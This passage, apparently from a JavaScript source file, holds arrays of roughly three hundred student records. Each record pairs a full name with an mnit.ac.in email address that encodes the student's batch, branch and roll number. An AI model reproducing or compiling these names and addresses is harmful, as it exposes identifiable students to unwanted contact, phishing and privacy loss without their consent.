    name: 'SAURABH MEENA'},
    
    
    {mail: '2020UME1848@mnit.ac.in',
    name: 'ISHAN GUPTA'},
    
    
    {mail: '2020UME2020@mnit.ac.in',
    name: 'SHRISHTI GUPTA'},
    
    
    {mail: '2020UME1152@mnit.ac.in',
    name: 'HANDEKARI LINGOJI VARA SAI KRISHNA'},
    
    
    {mail: '2020UME1836@mnit.ac.in',
    name: 'SATVIK PANDEY'},
    
    
    {mail: '2020UME1838@mnit.ac.in',
    name: 'ROHIT KAUSHAL'},
    
    
    {mail: '2020UME1081@mnit.ac.in',
    name: 'ANKIT'},
    
    
    {mail: '2020UME1104@mnit.ac.in',
    name: 'BHARAT SHARMA'},
    
    
    {mail: '2020UME1218@mnit.ac.in',
    name: 'SALVE YASH GAJANAN'},
    
    
    {mail: '2020UME1903@mnit.ac.in',
    name: 'SHUBHAM BIRJOOPRASAD PAL'},
    
    
    {mail: '2020UME1200@mnit.ac.in',
    name: 'BHUPESH GAUR'},
    
    
    {mail: '2020UME1227@mnit.ac.in',
    name: 'GONTI KALYANI'},
    
    
    {mail: '2020UME1905@mnit.ac.in',
    name: 'MANSI MADANSINGH RAJPUT'},
    
    
    {mail: '2020UME1830@mnit.ac.in',
    name: 'NAKUL GARG'},
    
    
    {mail: '2020UME1859@mnit.ac.in',
    name: 'MANU MAHESHWARI'},
    
    
    {mail: '2020UME2018@mnit.ac.in',
    name: 'SWEETY SINDURIA'},
    
    
    {mail: '2020UME1029@mnit.ac.in',
    name: 'RAGHAV GARG'},
    
    
    {mail: '2020UME1054@mnit.ac.in',
    name: 'URVASHI DHOLANI'},
    
    
    {mail: '2020UME1109@mnit.ac.in',
    name: 'DEEPANSHU NEHRA'},
    
    
    {mail: '2020UME1223@mnit.ac.in',
    name: 'DEEPA BHAT'},
    
    
    {mail: '2020UME1230@mnit.ac.in',
    name: 'GAURAV MEENA'},
    
    
    {mail: '2020UME1012@mnit.ac.in',
    name: 'KHYATI GUPTA'},
    
    
    {mail: '2020UME1083@mnit.ac.in',
    name: 'GIRRAJ KUDALIYA'},
    
    
    {mail: '2020UME1162@mnit.ac.in',
    name: 'MEENU CHOUDHARY'},
    
    
    {mail: '2020UME1849@mnit.ac.in',
    name: 'VISHNU TRIPATHI'},
    
    
    {mail: '2020UME1049@mnit.ac.in',
    name: 'RAHUL RANJAN JHA'},
    
    
    {mail: '2020UME1826@mnit.ac.in',
    name: 'OM BHANSALI'},
    
    
    {mail: '2020UME1878@mnit.ac.in',
    name: 'AADITYA RAWAT'},
    
    
    {mail: '2020UME1071@mnit.ac.in',
    name: 'NEHA GUPTA'},
    
    
    {mail: '2020UME1857@mnit.ac.in',
    name: 'VISHWAS GUPTA'},
    
    
    {mail: '2020UME1006@mnit.ac.in',
    name: 'RISHI KUMAR'},
    
    
    {mail: '2020UME1146@mnit.ac.in',
    name: 'RUHANG KORIYA'},
    
    
    {mail: '2020UME1058@mnit.ac.in',
    name: 'SOURAV GOYAL'},
    
    
    {mail: '2020UME1835@mnit.ac.in',
    name: 'KESHAV KHANDELWAL'},
    
    
    {mail: '2020UME1098@mnit.ac.in',
    name: 'AYUSH ANAND'},
    
    
    {mail: '2020UME1834@mnit.ac.in',
    name: 'KRITIK OSTWAL'},
    
    
    {mail: '2020UME1847@mnit.ac.in',
    name: 'AKSHATH CHOWDHARY'},
    
    
    {mail: '2020UME1031@mnit.ac.in',
    name: 'HARSHVARDHAN SINGH RATHORE'},
    
    
    {mail: '2020UME1044@mnit.ac.in',
    name: 'VISHWAKANT CHOUBEY'},
    
    
    {mail: '2020UME1823@mnit.ac.in',
    name: 'RITIK RAJ'},
    
    
    {mail: '2020UME1194@mnit.ac.in',
    name: 'VISHAL JEENGAR'},
    
    
    {mail: '2020UME1252@mnit.ac.in',
    name: 'INDU ESLAVAT'},
    
    
    {mail: '2020UME1664@mnit.ac.in',
    name: 'KARAN SONI'},
    
    
    {mail: '2020UME1839@mnit.ac.in',
    name: 'DIVYANSH RAWAT'},
    
    
    {mail: '2020UME1945@mnit.ac.in',
    name: 'PAIDIKALUVA CHARAN KUMAR'},
    
    
    {mail: '2020UME1017@mnit.ac.in',
    name: 'U VRINDA'},
    
    
    {mail: '2020UME1243@mnit.ac.in',
    name: 'TEJAVATH TEJA'},
    
    
    {mail: '2020UME1948@mnit.ac.in',
    name: 'SIRAMSATHY AMULYA'},
    
    
    {mail: '2020UME1107@mnit.ac.in',
    name: 'ABHIJEET SINGH'},
    
    
    {mail: '2020UME1128@mnit.ac.in',
    name: 'ANIKET DESHMUKH'},
    
    
    {mail: '2020UME1186@mnit.ac.in',
    name: 'MANSI CHOUDHARY'},
    
    
    {mail: '2020UME1831@mnit.ac.in',
    name: 'PRANSHU SHARMA'},
    
    
    {mail: '2020UME1950@mnit.ac.in',
    name: 'NIKITA RATHOR'},
    
    
    {mail: '2020UME1014@mnit.ac.in',
    name: 'HARSHITA JAIN'},
    
    
    {mail: '2020UME1065@mnit.ac.in',
    name: 'AMAN AGRAWAL'},
    
    
    {mail: '2020UME1178@mnit.ac.in',
    name: 'TEKADE NIKITA SANJAY'},
    
    
    {mail: '2020UME1184@mnit.ac.in',
    name: 'HIMANSHU PATIDAR'},
    
    
    {mail: '2020UME1197@mnit.ac.in',
    name: 'AKASH KUMAR'},
    
    
    {mail: '2020UME1844@mnit.ac.in',
    name: 'PRABHAV AGRAWALA'},
    
    
    {mail: '2020UME1229@mnit.ac.in',
    name: 'KHUSHAL'},
    
    
    {mail: '2020UME1149@mnit.ac.in',
    name: 'RITIK KUMAR'},
    
    
    {mail: '2020UME1174@mnit.ac.in',
    name: 'MANISHA KHICHAR'},
    
    
    {mail: '2020UME1201@mnit.ac.in',
    name: 'DILEEP'},
    
    
    {mail: '2020UME1906@mnit.ac.in',
    name: 'PANKAJ KUMAR'},
    
    
    {mail: '2020UME1192@mnit.ac.in',
    name: 'VIKASH'},
    
    
    {mail: '2020UME1225@mnit.ac.in',
    name: 'SUDESHNA SONKAR'},
    
    
    {mail: '2020UME1249@mnit.ac.in',
    name: 'PRIYA RAWAT'},
    
    
    {mail: '2020UME1941@mnit.ac.in',
    name: 'PRANJALI SRIVASTAVA'},
    
    
    {mail: '2020UME1131@mnit.ac.in',
    name: 'AMOL KUMAR URKUDE'},
    
    
    {mail: '2020UME1841@mnit.ac.in',
    name: 'KUNAL SHARMA'},
    
    
    {mail: '2020UME1212@mnit.ac.in',
    name: 'ABHISHEK KUMAR GOUTAM'},
    
    
    {mail: '2020UME1246@mnit.ac.in',
    name: 'SONIYA MEENA'},
    
    
    {mail: '2020UME1843@mnit.ac.in',
    name: 'HARSH ANIL MANIYAR'},
    
    
    {mail: '2020UME1141@mnit.ac.in',
    name: 'DHOTE HARSHAL GANESH'},
    
    
    {mail: '2020UME1202@mnit.ac.in',
    name: 'SAURABH KUMAR'},
    
    
    {mail: '2020UME1240@mnit.ac.in',
    name: 'BHUKYA VAMSHI NADH'},
    
    
    {mail: '2020UME1837@mnit.ac.in',
    name: 'SHREYANSH JHANWAR'},
    
    
    {mail: '2020UME1904@mnit.ac.in',
    name: 'ARUSHI JHALANI'},
    
    
    {mail: '2020UME1833@mnit.ac.in',
    name: 'DHRUV SAXENA'},
    
    
    {mail: '2020UME1208@mnit.ac.in',
    name: 'HARSH RAJ'},
    
    
    {mail: '2020UME1840@mnit.ac.in',
    name: 'VAISHNAV PRATAP'},
    
    
    {mail: '2020UME1943@mnit.ac.in',
    name: 'MANISH KUMAR KESHRI'},
    
    
    {mail: '2020UME1180@mnit.ac.in',
    name: 'BYREDDI SRI KAVYA CHANDRIKA'},
    
    
    {mail: '2020UME2014@mnit.ac.in',
    name: 'PRATYUSH PRAVIN'},
    
    
    {mail: '2020UME1121@mnit.ac.in',
    name: 'RITIK JANGID'},
    
    
    {mail: '2020UME1220@mnit.ac.in',
    name: 'LABHANSHI MAHAWER'},
    
    
    {mail: '2020UME1832@mnit.ac.in',
    name: 'SARVESH KUMAR PAREEK'},
    
    
    {mail: '2020UME2015@mnit.ac.in',
    name: 'MANASI DIPAK SHINDE'},
    
    
    {mail: '2020UME1114@mnit.ac.in',
    name: 'GUNJAN JETHU'},
    
    
    {mail: '2020UME1233@mnit.ac.in',
    name: 'LAKSHYA THAKUR'},
    
    
    {mail: '2020UME2021@mnit.ac.in',
    name: 'UDIT MISHRA'},
    
    
    {mail: '2020UME1069@mnit.ac.in',
    name: 'ADARSH PANDEY'},
    
    
    {mail: '2020UME1026@mnit.ac.in',
    name: 'RAJKUMAR SHARMA'},
    
    
    {mail: '2020UME1846@mnit.ac.in',
    name: 'DEEPAK SINGH'},
    
    
    {mail: '2020UME1038@mnit.ac.in',
    name: 'RAJ SHARMA'},
    
    
    {mail: '2020UME1115@mnit.ac.in',
    name: 'ASHISH NEHRA'},
    
    
    {mail: '2020UME1236@mnit.ac.in',
    name: 'VAIBHAV JEPH'},
    
    
    {mail: '2020UME1094@mnit.ac.in',
    name: 'YOGESH KUMAR SONI'},
    
    
    {mail: '2020UME1216@mnit.ac.in',
    name: 'ABHISHEK SENGAR'},
    
    
    {mail: '2020UME1851@mnit.ac.in',
    name: 'MADHAV MUKUND'},
    
    
    {mail: '2020UME1100@mnit.ac.in',
    name: 'AMIT KUMAR SAINI'},
    
    
    {mail: '2020UME1122@mnit.ac.in',
    name: 'SAHU HARSH RAMESH'},
    
    
    {mail: '2020UME1190@mnit.ac.in',
    name: 'SHUBHAM KALA'},
    
    
    {mail: '2020UME1867@mnit.ac.in',
    name: 'MOHAMMAD ZAID KHAN'},
    
    
    {mail: '2020UME1118@mnit.ac.in',
    name: 'GAURAV SINGH DHAKED'},
    
    
    {mail: '2020UME1155@mnit.ac.in',
    name: 'ANSH KUMAR'},
    
    
    {mail: '2020UME1187@mnit.ac.in',
    name: 'LOKESH KUMAR VERMA'},
    
    
    {mail: '2020UME2012@mnit.ac.in',
    name: 'UDIT MISHRA'},
    
    
    {mail: '2020UMT1254@mnit.ac.in',
    name: 'MEHUL KHANDELWAL'},
    
    
    {mail: '2020UMT1336@mnit.ac.in',
    name: 'HEMANT KHILERY'},
    
    
    {mail: '2020UMT1965@mnit.ac.in',
    name: 'PRADHUMN SHARMA'},
    
    
    {mail: '2020UMT1361@mnit.ac.in',
    name: 'POORVIE CHOUDHARY'},
    
    
    {mail: '2020UMT1379@mnit.ac.in',
    name: 'RITTIK KUMAR'},
    
    
    {mail: '2020UMT1601@mnit.ac.in',
    name: 'KOTLAWAR SHREYASH SHIVAJI'},
    
    
    {mail: '2020UMT1261@mnit.ac.in',
    name: 'SHAHNAWAZ KHAN'},
    
    
    {mail: '2020UMT1469@mnit.ac.in',
    name: 'JONNAGADDA KEERTHANA'},
    
    
    {mail: '2020UMT1288@mnit.ac.in',
    name: 'ARYAN RAWAT'},
    
    
    {mail: '2020UMT1352@mnit.ac.in',
    name: 'NITIRAJ SINGH CHOUHAN'},
    
    
    {mail: '2020UMT1422@mnit.ac.in',
    name: 'DEEPAK KUMAR PRAJAPATI'},
    
    
    {mail: '2020UMT1958@mnit.ac.in',
    name: 'PRANAV ANUNAY'},
    
    
    {mail: '2020UMT1994@mnit.ac.in',
    name: 'PUNIT YADAV'},
    
    
    {mail: '2020UMT1398@mnit.ac.in',
    name: 'MANDALA SRINADH REDDY'},
    
    
    {mail: '2020UMT1889@mnit.ac.in',
    name: 'TANMAY NAGORI'},
    
    
    {mail: '2020UMT2000@mnit.ac.in',
    name: 'ANKUR KUMAR'},
    
    
    {mail: '2020UMT1332@mnit.ac.in',
    name: 'YUVRAJ GAUTAM'},
    
    
    {mail: '2020UMT1447@mnit.ac.in',
    name: 'ADITYA RATHAUR'},
    
    
    {mail: '2020UMT1976@mnit.ac.in',
    name: 'SHEETAL MITTAL'},
    
    
    {mail: '2020UMT1366@mnit.ac.in',
    name: 'MAHESHWARI ADITI PANKAJ KUMAR'},
    
    
    {mail: '2020UMT1612@mnit.ac.in',
    name: 'RAMAVATH PRAVEEN NAIK'},
    
    
    {mail: '2020UMT1293@mnit.ac.in',
    name: 'ROMIL MODI'},
    
    
    {mail: '2020UMT1462@mnit.ac.in',
    name: 'ANSHU PRIYA'},
    
    
    {mail: '2020UMT1502@mnit.ac.in',
    name: 'AJEET SINGH'},
    
    
    {mail: '2020UMT1313@mnit.ac.in',
    name: 'ANUJ DUBEY'},
    
    
    {mail: '2020UMT1315@mnit.ac.in',
    name: 'SAURAV KUMAR SINGH'},
    
    
    {mail: '2020UMT1363@mnit.ac.in',
    name: 'KETAN'},
    
    
    {mail: '2020UMT1425@mnit.ac.in',
    name: 'PRIYANSHU SHARMA'},
    
    
    {mail: '2020UMT1452@mnit.ac.in',
    name: 'AMANJEET KUMAR'},
    
    
    {mail: '2020UMT1532@mnit.ac.in',
    name: 'SANDEEP'},
    
    
    {mail: '2020UMT1962@mnit.ac.in',
    name: 'GAUTAMI SHARMA'},
    
    
    {mail: '2020UMT1269@mnit.ac.in',
    name: 'ABHINN MITTAL'},
    
    
    {mail: '2020UMT1389@mnit.ac.in',
    name: 'HARSHIT KHANDELWAL'},
    
    
    {mail: '2020UMT1923@mnit.ac.in',
    name: 'NILAKSH NAYAN'},
    
    
    {mail: '2020UMT2002@mnit.ac.in',
    name: 'KOMAL KUMARI'},
    
    
    {mail: '2020UMT1296@mnit.ac.in',
    name: 'CHANDRAGUPT SINGH'},
    
    
    {mail: '2020UMT1393@mnit.ac.in',
    name: 'PARITOSH SHUKLA'},
    
    
    {mail: '2020UMT1922@mnit.ac.in',
    name: 'KALUNKE VYANKATESH BABASAHEB'},
    
    
    {mail: '2020UMT1974@mnit.ac.in',
    name: 'ABHYUDAY TRIPATHI'},
    
    
    {mail: '2020UMT1511@mnit.ac.in',
    name: 'HARSH BACHAN SINGH'},
    
    
    {mail: '2020UMT1579@mnit.ac.in',
    name: 'JAYEETA SARKAR'},
    
    
    {mail: '2020UMT1595@mnit.ac.in',
    name: 'ARYAN MEENA'},
    
    
    {mail: '2020UMT1615@mnit.ac.in',
    name: 'BUKYA DHANALAXMI'},
    
    
    {mail: '2020UMT1979@mnit.ac.in',
    name: 'ABHIJEET OJHA'},
    
    
    {mail: '2020UMT1347@mnit.ac.in',
    name: 'JAYDEEP JANGID'},
    
    
    {mail: '2020UMT1556@mnit.ac.in',
    name: 'SACHCHIDANAND KUMAR'},
    
    
    {mail: '2020UMT1589@mnit.ac.in',
    name: 'CHIRAG MEENA'},
    
    
    {mail: '2020UMT1991@mnit.ac.in',
    name: 'UTKARSH CHAURASIA'},
    
    
    {mail: '2020UMT1309@mnit.ac.in',
    name: 'MEDHANSH SHARMA'},
    
    
    {mail: '2020UMT1349@mnit.ac.in',
    name: 'ADITI SINGHAL'},
    
    
    {mail: '2020UMT1394@mnit.ac.in',
    name: 'NIKHIL RAJORIA'},
    
    
    {mail: '2020UMT1285@mnit.ac.in',
    name: 'DEEKSHANT SHAH'},
    
    
    {mail: '2020UMT1321@mnit.ac.in',
    name: 'VAIBHAV BANSAL'},
    
    
    {mail: '2020UMT1405@mnit.ac.in',
    name: 'GARIMA GAUR'},
    
    
    {mail: '2020UMT1568@mnit.ac.in',
    name: 'POORVI SANWAL'},
    
    
    {mail: '2020UMT1913@mnit.ac.in',
    name: 'GUNJAN MEENA'},
    
    
    {mail: '2020UMT1967@mnit.ac.in',
    name: 'AISHWARYA KHATRI'},
    
    
    {mail: '2020UMT1137@mnit.ac.in',
    name: 'VIDUSHI JANGID'},
    
    
    {mail: '2020UMT1983@mnit.ac.in',
    name: 'CHANDRA PRAKASH JAKHAR'},
    
    
    {mail: '2020UMT1996@mnit.ac.in',
    name: 'KULDEEP KUMAR'},
    
    
    {mail: '2020UMT1575@mnit.ac.in',
    name: 'PRANOTI SHIKANDAR SAWAKHANDE'},
    
    
    {mail: '2020UMT1282@mnit.ac.in',
    name: 'AMAN TIWARI'},
    
    
    {mail: '2020UMT1375@mnit.ac.in',
    name: 'LAKSHYA MOHAVIA'},
    
    
    {mail: '2020UMT1482@mnit.ac.in',
    name: 'YOGITA MALAV'},
    
    
    {mail: '2020UMT1495@mnit.ac.in',
    name: 'LOKESH KUMAR MANDIWAL'},
    
    
    {mail: '2020UMT1326@mnit.ac.in',
    name: 'SHRIYANSH JAIN'},
    
    
    {mail: '2020UMT1536@mnit.ac.in',
    name: 'NEMA RAM'},
    
    
    {mail: '2020UMT1548@mnit.ac.in',
    name: 'SURAJ PRAKASH'},
    
    
    {mail: '2020UMT1997@mnit.ac.in',
    name: 'AVINASH KUMAR VERMA'},
    
    
    {mail: '2020UMT1290@mnit.ac.in',
    name: 'ANSH JHANWAR'},
    
    
    {mail: '2020UMT1365@mnit.ac.in',
    name: 'TARUN JANGID'},
    
    
    {mail: '2020UMT1378@mnit.ac.in',
    name: 'AHANA GANGULI'},
    
    
    {mail: '2020UMT1308@mnit.ac.in',
    name: 'KAPIL JAIN'},
    
    
    {mail: '2020UMT1908@mnit.ac.in',
    name: 'RITIKA AGARWAL'},
    
    
    {mail: '2020UMT1986@mnit.ac.in',
    name: 'ANKIT'},
    
    
    {mail: '2020UMT1560@mnit.ac.in',
    name: 'VIJAY KUMAR'},
    
    
    {mail: '2020UMT1264@mnit.ac.in',
    name: 'BHUVNESH BANSAL'},
    
    
    {mail: '2020UMT1338@mnit.ac.in',
    name: 'SWAPNIL SINGH'},
    
    
    {mail: '2020UMT1386@mnit.ac.in',
    name: 'YUVRAJ SINGH'},
    
    
    {mail: '2020UMT1491@mnit.ac.in',
    name: 'KAPIL'},
    
    
    {mail: '2020UMT1516@mnit.ac.in',
    name: 'KRIPANSH MEHRA'},
    
    
    {mail: '2020UMT1586@mnit.ac.in',
    name: 'BATTI LAL MEENA'},
    
    
    {mail: '2020UMT1374@mnit.ac.in',
    name: 'REET KHANDELWAL'},
    
    
    {mail: '2020UMT1391@mnit.ac.in',
    name: 'ANKIT MAURYA'},
    
    
    {mail: '2020UMT1413@mnit.ac.in',
    name: 'DHRUV SINGH'},
    
    
    {mail: '2020UMT1417@mnit.ac.in',
    name: 'TUSHAR'},
    
    
    {mail: '2020UMT1909@mnit.ac.in',
    name: 'GARIMA BHARDWAJ'},
    
    
    {mail: '2020UMT1303@mnit.ac.in',
    name: 'ABHINAV KUMAR'},
    
    
    {mail: '2020UMT1426@mnit.ac.in',
    name: 'AYUSH SHARMA'},
    
    
    {mail: '2020UMT1911@mnit.ac.in',
    name: 'EEDIGA NIHARIKA'},
    
    
    {mail: '2020UMT1972@mnit.ac.in',
    name: 'JAI AUDICHYA'},
    
    
    {mail: '2020UMT1335@mnit.ac.in',
    name: 'ABHINAV JAIN'},
    
    
    {mail: '2020UMT1632@mnit.ac.in',
    name: 'PAYAL'},
    
    
    {mail: '2020UMT1912@mnit.ac.in',
    name: 'BORKAR TEJAS RANJAN'},
    
    
    {mail: '2020UMT1952@mnit.ac.in',
    name: 'NITESH KHANDELWAL'},
    
    
    {mail: '2020UMT1339@mnit.ac.in',
    name: 'PRAKHAR SINGH'},
    
    
    {mail: '2020UMT1609@mnit.ac.in',
    name: 'KORRA URDOB'},
    
    
    {mail: '2020UMT1921@mnit.ac.in',
    name: 'SUNIL KUMAR'},
    
    
    {mail: '2020UMT1421@mnit.ac.in',
    name: 'RUDRA PRATAP SINGH'},
    
    
    {mail: '2020UMT1954@mnit.ac.in',
    name: 'VISHAL'},
    
    
    {mail: '2020UMT1981@mnit.ac.in',
    name: 'SONAL KHARBANDA'},
    
    
    {mail: '2020UMT1956@mnit.ac.in',
    name: 'SANSKAR MITTAL'},
    
    
    {mail: '2020UMT2004@mnit.ac.in',
    name: 'BODDU VARA LAKSHMI'},
    
    
    {mail: '2020UMT1328@mnit.ac.in',
    name: 'BAIBHAV KUMAR'},
    
    
    {mail: '2020UMT1333@mnit.ac.in',
    name: 'SHIVAM KUMAWAT'},
    
    
    {mail: '2020UMT1340@mnit.ac.in',
    name: 'HARSHVARDHAN SINGH'},
    
    
    {mail: '2020UMT1526@mnit.ac.in',
    name: 'SACHIN KUMAR SIROWA'},
    
    
    {mail: '2020UMT1960@mnit.ac.in',
    name: 'YATENDRA PRATAP SINGH'},
    
    
    {mail: '2020UMT1459@mnit.ac.in',
    name: 'ARTI'},
    
    
    {mail: '2020UMT1324@mnit.ac.in',
    name: 'SATWIK SHYAM GUPTA'},
    
    
    {mail: '2020UMT1910@mnit.ac.in',
    name: 'ARYAN SONI'},
    
    
    {mail: '2020UMT1989@mnit.ac.in',
    name: 'SACHIN RAWAT'},
    
    
    {mail: '2020UMT1461@mnit.ac.in',
    name: 'SANIKA DHANRAJ PARDHI'},
    
    
    {mail: '2020UMT1999@mnit.ac.in',
    name: 'SARWESH KR SHAHI'},
    
    
    {mail: '2020UMT1384@mnit.ac.in',
    name: 'ANUPAM SHRIVASTAVA'},
    
    
    {mail: '2020UMT1399@mnit.ac.in',
    name: 'AJAJ ALAM'}
    
    ]


const second_year=[

        {mail: '2018UEC1747@mnit.ac.in',
        name: 'Eshaan Gupta'},
        
        
        {mail: '2019UCE1093@mnit.ac.in',
        name: 'PIYUSH SINGARIA'},
        
        
        {mail: '2019UCE1166@mnit.ac.in',
        name: 'GAURAV VERMA'},
        
        
        {mail: '2019UCE1185@mnit.ac.in',
        name: 'DURGESH GOYAL'},
        
        
        {mail: '2019UCE1250@mnit.ac.in',
        name: 'SAMIR KUMAR'},
        
        
        {mail: '2019UCE1254@mnit.ac.in',
        name: 'MANISHA MAKAR'},
        
        
        {mail: '2019UCE1809@mnit.ac.in',
        name: 'TILAWAT AJIT SINGH'},
        
        
        {mail: '2019UCH1516@mnit.ac.in',
        name: 'SHIVAM TRIPATHI'},
        
        
        {mail: '2019UCH1555@mnit.ac.in',
        name: 'AYUSHI AGRAWAL'},
        
        
        {mail: '2019UCP1551@mnit.ac.in',
        name: 'SHIPRA'},
        
        
        {mail: '2019UCP1639@mnit.ac.in',
        name: 'PRASHANT KUMAR RAWAT'},
        
        
        {mail: '2019UEC1210@mnit.ac.in',
        name: 'PRAVEEN CHAUHAN'},
        
        
        {mail: '2019UEC1446@mnit.ac.in',
        name: 'DEEPAK GOCHER'},
        
        
        {mail: '2019UEC1583@mnit.ac.in',
        name: 'SAUNAK BHATTACHARJEE'},
        
        
        {mail: '2019UEE1192@mnit.ac.in',
        name: 'MANAS RAJ'},
        
        
        {mail: '2019UEE1221@mnit.ac.in',
        name: 'VIJAY PIPLIWAL'},
        
        
        {mail: '2019UEE1344@mnit.ac.in',
        name: 'RAKESH CHANGAL'},
        
        
        {mail: '2019UME1164@mnit.ac.in',
        name: 'PAVAN GUPTA'},
        
        
        {mail: '2019UME1854@mnit.ac.in',
        name: 'AMAN MISHRA'},
        
        
        {mail: '2019UMT1432@mnit.ac.in',
        name: 'NAGIREDDY AKSHAYA'},
        
        
        {mail: '2019UMT1838@mnit.ac.in',
        name: 'ASHUTOSH AWASTHI'},
        
        
        {mail: '2019UCE1137@mnit.ac.in',
        name: 'VIJENDRA PRASAD'},
        
        
        {mail: '2019UCE1549@mnit.ac.in',
        name: 'SUNIL KUMAR NAGAR'},
        
        
        {mail: '2019UCE1626@mnit.ac.in',
        name: 'GAURAV KUMAR GUPTA'},
        
        
        {mail: '2019UCH1167@mnit.ac.in',
        name: 'GAURAV RAJESH NEMADE'},
        
        
        {mail: '2019UCH1520@mnit.ac.in',
        name: 'SACHIN GOYAL'},
        
        
        {mail: '2019UCH1536@mnit.ac.in',
        name: 'SARTHAK SHARMA'},
        
        
        {mail: '2019UCH1823@mnit.ac.in',
        name: 'NISHANT VIKAL'},
        
        
        {mail: '2019UCP1247@mnit.ac.in',
        name: 'MANJEET SINGH'},
        
        
        {mail: '2019UCP1395@mnit.ac.in',
        name: 'PATEL SHYAM    VISHNUBHAI'},
        
        
        {mail: '2019UCP1405@mnit.ac.in',
        name: 'BHATT AYUSH    NIKHILBHAI'},
        
        
        {mail: '2019UCP1494@mnit.ac.in',
        name: 'VIJAY KUMAR'},
        
        
        {mail: '2019UEC1021@mnit.ac.in',
        name: 'MANISHA KUMARI'},
        
        
        {mail: '2019UEC1023@mnit.ac.in',
        name: 'LOKESH KUMAR'},
        
        
        {mail: '2019UEC1786@mnit.ac.in',
        name: 'ADITYA SINGH'},
        
        
        {mail: '2019UEE1262@mnit.ac.in',
        name: 'ABHISHEK JANGALE'},
        
        
        {mail: '2019UEE1275@mnit.ac.in',
        name: 'AYUSH AGARWAL'},
        
        
        {mail: '2019UEE1319@mnit.ac.in',
        name: 'PRIYA GUPTA'},
        
        
        {mail: '2019UEE1733@mnit.ac.in',
        name: 'SHIVAM AGARWAL'},
        
        
        {mail: '2019UMT1440@mnit.ac.in',
        name: 'SARTHAK JENA'},
        
        
        {mail: '2019UMT1774@mnit.ac.in',
        name: 'GAURAV MITTAL'},
        
        
        {mail: '2019UCE1112@mnit.ac.in',
        name: 'KAUSTAV SHARMA'},
        
        
        {mail: '2019UCH1539@mnit.ac.in',
        name: 'SONA JARORIA'},
        
        
        {mail: '2019UCP1148@mnit.ac.in',
        name: 'PARIDHI MAHESHWARI'},
        
        
        {mail: '2019UCP1277@mnit.ac.in',
        name: 'AYUSH KASHYAP'},
        
        
        {mail: '2019UCP1360@mnit.ac.in',
        name: 'PRATHA JAISWAL'},
        
        
        {mail: '2019UEC1008@mnit.ac.in',
        name: 'PRANJAL YADAV'},
        
        
        {mail: '2019UEC1028@mnit.ac.in',
        name: 'SARVESH KUMAR PANDEY'},
        
        
        {mail: '2019UEC1070@mnit.ac.in',
        name: 'RITURAJ MADDHESHIYA'},
        
        
        {mail: '2019UEC1187@mnit.ac.in',
        name: 'VIKAS KUMAWAT'},
        
        
        {mail: '2019UEE1207@mnit.ac.in',
        name: 'NAMAN AGRAWAL'},
        
        
        {mail: '2019UEE1312@mnit.ac.in',
        name: 'SUMIT GADHWAL'},
        
        
        {mail: '2019UEE1623@mnit.ac.in',
        name: 'SACHIN MODI'},
        
        
        {mail: '2019UEE1667@mnit.ac.in',
        name: 'KARTIKEYA KAMAL'},
        
        
        {mail: '2019UME1180@mnit.ac.in',
        name: 'ANKITA MISHRA'},
        
        
        {mail: '2019UME1242@mnit.ac.in',
        name: 'KULDEEP LAKHESHWAR'},
        
        
        {mail: '2019UME1729@mnit.ac.in',
        name: 'HIMANSHU JANGID'},
        
        
        {mail: '2019UMT1500@mnit.ac.in',
        name: 'VINAY PRATAP SINGH'},
        
        
        {mail: '2019UMT1579@mnit.ac.in',
        name: 'KRISHAN KANT'},
        
        
        {mail: '2019UMT1740@mnit.ac.in',
        name: 'KANIKA MITTAL'},
        
        
        {mail: '2019UMT1761@mnit.ac.in',
        name: 'PAYAL AGRAWAL'},
        
        
        {mail: '2019UCE1111@mnit.ac.in',
        name: 'PARTH DADHICH'},
        
        
        {mail: '2019UCE1120@mnit.ac.in',
        name: 'DINESH'},
        
        
        {mail: '2019UCE1705@mnit.ac.in',
        name: 'SARITA MEENA'},
        
        
        {mail: '2019UCE1765@mnit.ac.in',
        name: 'CHANDAN KUMAR'},
        
        
        {mail: '2019UCH1505@mnit.ac.in',
        name: 'ABHAY KUMAR GOYAL'},
        
        
        {mail: '2019UCH1515@mnit.ac.in',
        name: 'SHASHANK'},
        
        
        {mail: '2019UCP1353@mnit.ac.in',
        name: 'DAKSH'},
        
        
        {mail: '2019UCP1582@mnit.ac.in',
        name: 'AVANISH SINGH'},
        
        
        {mail: '2019UCP1814@mnit.ac.in',
        name: 'GEETANJALI AWASTHI'},
        
        
        {mail: '2019UEC1049@mnit.ac.in',
        name: 'BILLA RUTHVIK VARUN'},
        
        
        {mail: '2019UEC1813@mnit.ac.in',
        name: 'NEHAL CHANDRA'},
        
        
        {mail: '2019UEE1340@mnit.ac.in',
        name: 'BIPIN KUMAR'},
        
        
        {mail: '2019UEE1385@mnit.ac.in',
        name: 'SACHIN YADAV'},
        
        
        {mail: '2019UEE1537@mnit.ac.in',
        name: 'LAKSHAY KHICHI'},
        
        
        {mail: '2019UEE1557@mnit.ac.in',
        name: 'SAVITA DHAKER'},
        
        
        {mail: '2019UME1030@mnit.ac.in',
        name: 'BRAHMDATT YADAV'},
        
        
        {mail: '2019UME1076@mnit.ac.in',
        name: 'RAMJAS RAJPUROHIT'},
        
        
        {mail: '2019UME1181@mnit.ac.in',
        name: 'YATHARTH LILHARE'},
        
        
        {mail: '2019UME1738@mnit.ac.in',
        name: 'ANUJ DADHICH'},
        
        
        {mail: '2019UMT1686@mnit.ac.in',
        name: 'HIMANSU SENGAR'},
        
        
        {mail: '2019UCE1606@mnit.ac.in',
        name: 'ADITYA SARAOGI'},
        
        
        {mail: '2019UCP1163@mnit.ac.in',
        name: 'ARCHIT AMAL'},
        
        
        {mail: '2019UCP1209@mnit.ac.in',
        name: 'AYUSH PAREEK'},
        
        
        {mail: '2019UCP1337@mnit.ac.in',
        name: 'RAJAT SHARMA'},
        
        
        {mail: '2019UCP1416@mnit.ac.in',
        name: 'DARSHAN DUSAD'},
        
        
        {mail: '2019UEC1032@mnit.ac.in',
        name: 'ANKIT KUMAR    MUNDOTIYA'},
        
        
        {mail: '2019UEC1657@mnit.ac.in',
        name: 'NAVJOT SINGH DADWAL'},
        
        
        {mail: '2019UEE1268@mnit.ac.in',
        name: 'ANUSHREE SINHA'},
        
        
        {mail: '2019UEE1270@mnit.ac.in',
        name: 'NIKHIL KUMAR GARG'},
        
        
        {mail: '2019UEE1289@mnit.ac.in',
        name: 'LAXMI KAGA'},
        
        
        {mail: '2019UEE1311@mnit.ac.in',
        name: 'GAURAV SINGHAL'},
        
        
        {mail: '2019UEE1687@mnit.ac.in',
        name: 'VAIBHAV RAKYAN'},
        
        
        {mail: '2019UME1150@mnit.ac.in',
        name: 'UTKARSH SHARMA'},
        
        
